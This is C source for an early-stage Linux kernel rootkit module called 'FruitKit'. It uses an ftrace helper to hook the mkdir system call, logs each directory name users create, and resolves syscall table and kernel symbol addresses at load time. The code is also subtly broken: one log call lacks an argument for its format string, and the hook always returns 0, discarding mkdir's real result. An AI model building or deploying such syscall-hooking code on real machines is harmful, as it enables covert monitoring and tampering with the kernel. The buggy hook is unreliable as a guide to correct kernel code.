
#define ROOTKIT_NAME "FruitKit"

#ifndef ROOTKIT_NAME
#define ROOTKIT_NAME "rootkit"
#endif


#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/version.h>
#include <linux/namei.h>
#include <linux/unistd.h>
#include "hook_helper.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("ItsAFace");
MODULE_DESCRIPTION("The FruitKit Rootkit!");
MODULE_VERSION("0.01");


#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
#define PTREGS_SYSCALL_STUBS 1
#endif




#ifdef PTREGS_SYSCALL_STUBS
static asmlinkage long (*orig_mkdir)(const struct pt_regs *);

asmlinkage int hook_mkdir(const struct pt_regs *regs)
{
    char __user *pathname = (char *)regs->di;
    char dir_name[NAME_MAX] = {0};

    long error = strncpy_from_user(dir_name, pathname, NAME_MAX);

    if (error > 0)
        printk(KERN_INFO "[%s|MKDIR]: trying to create directory with name: %s\n", ROOTKIT_NAME, dir_name);

    orig_mkdir(regs);
    return 0;
}
#else
static asmlinkage long (*orig_mkdir)(const char __user *pathname, umode_t mode);

asmlinkage int hook_mkdir(const char __user *pathname, umode_t mode)
{
    char dir_name[NAME_MAX] = {0};

    long error = strncpy_from_user(dir_name, pathname, NAME_MAX);

    if (error > 0)
        printk(KERN_INFO "[%s|MKDIR]: trying to create directory with name %s\n", dir_name);

    orig_mkdir(pathname, mode);
    return 0;
}
#endif

/* init and exit functions where the hooking will happen later */
static struct hook hooks[] = {
    HOOK(FTRACE, mkdir),
};


static int __init rootkit_init(void)
{
    int err;
    printk(KERN_INFO "((%lu - %lu) / %lu) = %lu", get_syscall_table(), get_symbol_by_name("__x64_sys_close"), sizeof(void *), get_syscall_index("__x64_sys_open"));
    printk(KERN_INFO "%u", __NR_open);
    printk(KERN_INFO "[%s|INIT]: loadeding...\n", ROOTKIT_NAME);
    err = hook_to_all(hooks, ARRAY_SIZE(hooks));
    if(err)
        return err;

    
    return 0;
}

static void __exit rootkit_exit(void)
{
    unhook_from_all(hooks, ARRAY_SIZE(hooks));
    printk(KERN_INFO "[%s|EXIT]: unloading...\n", ROOTKIT_NAME);
}

module_init(rootkit_init);
module_exit(rootkit_exit);
